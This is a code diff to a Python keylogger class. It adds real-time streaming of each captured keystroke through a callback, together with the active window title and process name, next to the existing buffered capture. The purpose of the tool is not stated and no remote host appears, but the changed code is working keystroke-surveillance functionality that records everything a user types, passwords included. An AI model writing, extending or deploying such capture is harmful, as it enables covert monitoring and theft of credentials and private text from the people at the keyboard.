@@ -43,6 +43,14 @@ class KeystrokeLogger:
         Key.print_screen: '[PRTSC]',
     }
     
+    # Keys to ignore for live streaming (modifier keys that don't produce text)
+    IGNORE_FOR_LIVE = {
+        Key.shift, Key.shift_r,
+        Key.ctrl_l, Key.ctrl_r,
+        Key.alt_l, Key.alt_r,
+        Key.caps_lock, Key.cmd
+    }
+    
     @staticmethod
     def reconstruct_text(raw_keys: str) -> str:
         """
@@ -99,14 +107,16 @@ class KeystrokeLogger:
         
         return ''.join(result)
     
-    def __init__(self, event_callback):
+    def __init__(self, event_callback, live_keystroke_callback=None):
         """
         Initialize keystroke logger
         
         Args:
-            event_callback: Function to call with keystroke events
+            event_callback: Function to call with buffered keystroke events
+            live_keystroke_callback: Optional callback for real-time individual keystrokes
         """
         self.event_callback = event_callback
+        self.live_keystroke_callback = live_keystroke_callback
         self.buffer = []
         self.buffer_lock = threading.Lock()
         self.last_keystroke = time.time()  # Track last keystroke for inactivity detection
@@ -120,6 +130,10 @@ class KeystrokeLogger:
         self.shift_pressed = False
         self.ctrl_pressed = False
         self.alt_pressed = False
+    
+    def set_live_callback(self, callback):
+        """Set or update the live keystroke callback"""
+        self.live_keystroke_callback = callback
     
     def set_active_window(self, window_title: str, process_name: str):
         """Update the current active window context"""
@@ -159,11 +173,31 @@ class KeystrokeLogger:
             elif self.alt_pressed and len(char) == 1:
                 char = f'[ALT+{char.upper()}]'
             
-            # Add to buffer
+            timestamp = datetime.utcnow().isoformat()
+            
+            # Send live keystroke immediately if callback is set
+            # Skip modifier-only keys that don't produce visible output
+            if self.live_keystroke_callback and key not in self.IGNORE_FOR_LIVE:
+                try:
+                    self.live_keystroke_callback({
+                        'timestamp': timestamp,
+                        'event_type': 'live_keystroke',
+                        'category': 'input',
+                        'data': {
+                            'key': char,
+                            'target_window': self.active_window,
+                            'target_process': self.active_process
+                        }
+                    })
+                except Exception as e:
+                    if DEBUG_MODE:
+                        print(f"Live keystroke error: {e}")
+            
+            # Add to buffer for batched events (keeps phrase grouping for history)
             with self.buffer_lock:
                 self.buffer.append({
                     'char': char,
-                    'timestamp': datetime.utcnow().isoformat(),
+                    'timestamp': timestamp,
                     'window': self.active_window,
                     'process': self.active_process
                 })
